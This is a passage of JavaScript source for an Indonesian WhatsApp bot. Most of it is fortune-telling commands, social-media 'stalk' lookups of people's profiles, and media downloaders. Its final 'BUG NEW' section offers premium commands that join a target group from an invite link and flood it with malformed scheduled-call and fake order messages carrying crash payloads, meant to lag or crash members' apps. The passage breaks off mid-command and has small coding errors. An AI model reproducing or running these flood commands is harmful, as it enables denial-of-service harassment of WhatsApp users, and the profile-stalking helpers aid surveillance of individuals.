            case 'suamiistri': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika|Novia`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadian': {
    if (!m.isGroup) return newReply(mess.group)
    let member = participants.map(u => u.id)
    let orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]
    let jawab = `Ciee yang Jadian Jangan lupa pajak jadiannya

@${orang.split('@')[0]} ❤ @${jodoh.split('@')[0]}`
newReply(jawab)
}
break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) return newReply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)return newReply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) return newReply(`Contoh : 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            /* ~~~~~~~~~ STALKER ~~~~~~~~~ */
            case 'igstalk': {
            if (args.length == 0) return newReply(`Example: ${prefix + command} whyzzxy`)
            newReply(mess.wait)
            let j = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${lol}`)
                let caption = `Username : ${j.result.username}\n`
                caption += `Full Name : ${j.result.fullname}\n`
                caption += `Posts : ${j.result.posts}\n`
                caption += `Followers : ${j.result.followers}\n`
                caption += `Following : ${j.result.following}\n`
                caption += `Bio : ${j.result.bio}`
                ndaa.sendMessage(m.chat, { image: { url: j.result.photo_profile }, caption })
            }
            break

            case 'ttstalk': {
            if (args.length == 0) return newReply(`Example: ${prefix + command} dryan.pu`)
            newReply(mess.wait)
            let v = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${lol}`)
                let caption = `Username : ${v.result.username}\n`
                caption += `Nickname : ${v.result.nickname}\n`
                caption += `Followers : ${v.result.followers}\n`
                caption += `Followings : ${v.result.followings}\n`
                caption += `Likes : ${v.result.likes}\n`
                caption += `Video : ${v.result.video}\n`
                caption += `Bio : ${v.result.bio}\n`
                ndaa.sendMessage(m.chat, { image: { url: v.result.user_picture }, caption })
            }
            break
            
            case 'mlstalk': {
            if (args.length == 0) return newReply(`Example: ${prefix + command} 84830127/2169`)
            newReply(mess.wait)
            let data = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${lol}`)
            newReply(data.result)
            }
            break
            
            case 'ghstalk': {
            if (args.length == 0) return newReply(`Example: ${prefix + command} Ndaa`)
            newReply(mess.wait)
            let data = await fetchJson(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=${lol}`)
                var caption = `Name : ${data.result.name}\n`
                caption += `Link : ${data.result.url}\n`
                caption += `Public Repo : ${data.result.public_repos}\n`
                caption += `Public Gists : ${data.result.public_gists}\n`
                caption += `Followers : ${data.result.followers}\n`
                caption += `Following : ${data.result.following}\n`
                caption += `Bio : ${data.result.bio}`
                ndaa.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
            }
            break
            
            case 'twstalk': {
            if (args.length == 0) return newReply(`Example: ${prefix + command} jokowi`)
            newReply(mess.wait)
            let data = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${args[0]}?apikey=${lol}`)
                var caption = `Username : ${data.result.screen_name}\n`
                caption += `Name : ${data.result.name}\n`
                caption += `Tweet : ${data.result.tweet}\n`
                caption += `Joined : ${data.result.joined}\n`
                caption += `Followers : ${data.result.followers}\n`
                caption += `Following : ${data.result.following}\n`
                caption += `Like : ${data.result.like}\n`
                caption += `Description : ${data.result.description}`
                ndaa.sendMessage(m.chat, { image: { url: data.result.profile_picture }, caption })
            }
            break
            
            /* ~~~~~~~~~ DOWNLOADER ~~~~~~~~~ */
            case 'git': case 'gitclone':
            if (!args[0]) return newReply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
            if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            let [, user, repo] = args[0].match(regex1) || []
            repo = repo.replace(/.git$/, '')
            let url = `https://api.github.com/repos/${user}/${repo}/zipball`
            let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
            ndaa.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: fkontak }).catch((err) => newReply(mess.error))
            break
            case 'tiktok':
            let haha = `*Pilih Mau Yang Mana:*\n\n • Video: .ttv1 + Link\n • Audio: .ttv2 + Link.`
ndaa.sendMessage(m.chat, {
                        text: haha,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'DOWNLOADER',
                                body: 'TIKTOK',
                                thumbnailUrl: 'https://telegra.ph/file/c0349b2cfeba7e194d155.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
            case 'ttv1':
            case 'ttdl':
                if (!q) return newReply('where is the link')
                let e = await fetchJson(`https://api.caliph.biz.id/api/tiktok?url=${q}&apikey=${caliph}`)
                let ee = `*DOWNLOADER TIKTOK*\n\n_Title:_ ${e.data.title}\n_Likes:_ ${e.data.stats.likeCount}\n_Comment:_ ${e.data.stats.commentCount}\n_Share:_ ${e.data.stats.shareCount}`
                await ndaa.sendMessage(m.chat, {
                    video: {
                        url: e.data.video.noWatermark
                    },
                    caption: ee
                }, {
                    quoted: m
                })
                break

            case 'ttv2':
            case 'ttaudio': {
                if (!q) return newReply('where is the link')
                let i = await fetchJson(`https://api.caliph.biz.id/api/tiktok?url=${q}&apikey=${caliph}`)
                ndaa.sendMessage(m.chat, {
                    audio: {
                        url: i.data.music.play_url
                    },
                    mimetype: 'audio/mp4'
                }, {
                    quoted: m
                })
            }
            break
            case 'cocofun':
                if (!q) return newReply('where is the link')
                let j = await fetchJson(`https://api.lolhuman.xyz/api/cocofun?apikey=${lol}&url=${q}`)
                ndaa.sendMessage(m.chat, {
                    video: {
                        url: j.result.nowm
                    },
                    caption: j.result.tag
                }, {
                    quoted: ftroli
                })
                break
            case 'mediafire':
                if (!q) return newReply('where is the link')
                let ha = await fetchJson(`https://api.lolhuman.xyz/api/mediafire?apikey=${lol}&url=${q}`)
                ndaa.sendMessage(m.chat, {
                    document: {
                        url: ha.result.link
                    },
                    minetype: '*/*'
                }, {
                    quoted: ftroli
                })
                break

            case 'snackvideo':
            case 'sv':
                if (!q) return newReply('where is the link')
                let ma = await fetchJson(`https://api.lolhuman.xyz/api/snackvideo?apikey=${lol}&url=${q}`)
                ndaa.sendMessage(m.chat, {
                    video: {
                        url: ma.result.url
                    },
                    caption: ma.result.caption
                }, {
                    quoted: ftroli
                })
                break
            case 'yts': case 'play':{
if (!q) return await newReply(`Example: ${prefix+command} rewrite the stars`)
newReply(mess.wait)
let x = await fetchJson(`https://api.zahwazein.xyz/downloader/ytplay?apikey=${zenz}&query=${q}`)
let txt = `\`\`\`YOUTUBE SEARCH\`\`\`\n\n`
txt += `• Title : *${x.result.title}*\n`
txt += `• Duration : *${x.result.duration}*\n`
txt += `• url : *${x.result.url}*`
ndaa.sendMessage(m.chat, { image: { url: x.result.thumbnail }, caption: txt }, {quoted: m})
}
break
            case 'ytmp4': {
                if (!quoted) return newReply('where is the link')
                let data = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo?apikey=${lol}&url=${q}`)
                let txt = `\`\`\`YOUTUBE MP4\`\`\`\n\n`
                txt += `• Title : *${data.result.title}*\n`
                txt += `• Resolution: *${data.result.link.resolution}*\n`
                txt += `• Duration : *${data.result.duration}*\n`
                txt += `• Views : *${data.result.view}*\n`
                txt += `• Desc : ${data.result.description}\n\n`
                txt += `Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video.`
                await ndaa.sendMessage(m.chat, {
                    document: {
                        url: data.result.link.link
                    },
                    mimetype: 'video/mp4',
                    fileName: "Downloader YtMp4.mp4",
                    caption: txt,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${fake}`,
                            body: jam(),
                            thumbnailUrl: 'https://telegra.ph/file/de7b1cdcb5f49f18f2f44.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                }
                break
            case 'ytmp3': {
                if (!quoted) return newReply('where is the link')
                let data = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio?apikey=${lol}&url=${q}`)
                let mono = '```'
                let txtt = `\`\`\`YOUTUBE MP3\`\`\`\n\n`
                txtt += `• Title : *${data.result.title}*\n`
                txtt += `• Duration : *${data.result.duration}*\n`
                txtt += `• Views : *${data.result.view}*\n`
                txtt += `• Desc : ${data.result.description}`
                await ndaa.sendMessage(m.chat, {
                    document: {
                        url: data.result.link.link
                    },
                    mimetype: 'audio/mp3',
                    fileName: "Downloader YtMp3.mp3",
                    caption: txtt,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'DOWNLOADER YT MP3',
                            body: jam(),
                            thumbnailUrl: data.result.thumbnail,
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: ftroli
                })
                }
                break
            case 'ig':
            case 'igdl': {
                if (!q) return newReply("Link?")
                let ag = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${lol}&url=${q}`)
                for (var i = 0; i < ag.result.length; i++) {
                    let pap = ag.result[i].includes('.jpg') ? 'image' : 'video'
                    await ndaa.sendMessage(m.chat, {
                        [pap]: {
                            url: ag.result[i]
                        },
                        caption: ''
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            case 'pindl': {
                if (!q) return newReply("Link?")
                let apacuba = await fetchJson(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${lol}&url=${q}`)
                for (var i = 0; i < apacuba.result; i++) {
                    let pap = apacuba.result[i].includes('.jpg') ? 'image' : 'video'
                    await ndaa.sendMessage(m.chat, {
                        [pap]: {
                            url: apacuba.result[i]
                        },
                        caption: ''
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            case 'igdlh':
            case 'highlights': {
                if (!q) return newReply('Link?')
                let ap = await fetchJson(`https://api.lolhuman.xyz/api/ig-highlights?apikey=${lol}&url=${q}`)
                for (var oa = 0; oa < ap.result.length; oa++) {
                    let pap = ap.result[oa].includes('.jpg') ? 'image' : 'video'
                    await ndaa.sendMessage(m.chat, {
                        [pap]: {
                            url: ap.result[oa]
                        },
                        caption: ''
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            /* ~~~~~~~~~ BUG NEW ~~~~~~~~~ */
case 'gcbug' : {
if (!isPremium) return newReply(mess.prem)
 if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'delaygcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'laggcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'bomgcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'unlimitedgcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'trollygcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
ndaa.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'docugcbug' :  {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await ndaa.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break   
        case 'bug1': {
if (!isPremium) return newReply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${buttonkal}`
 }
}
ndaa.relayMessage(m.chat, call, {})
}
break
case 'amountbug': {
if (!isPremium) return newReply(mess.prem)
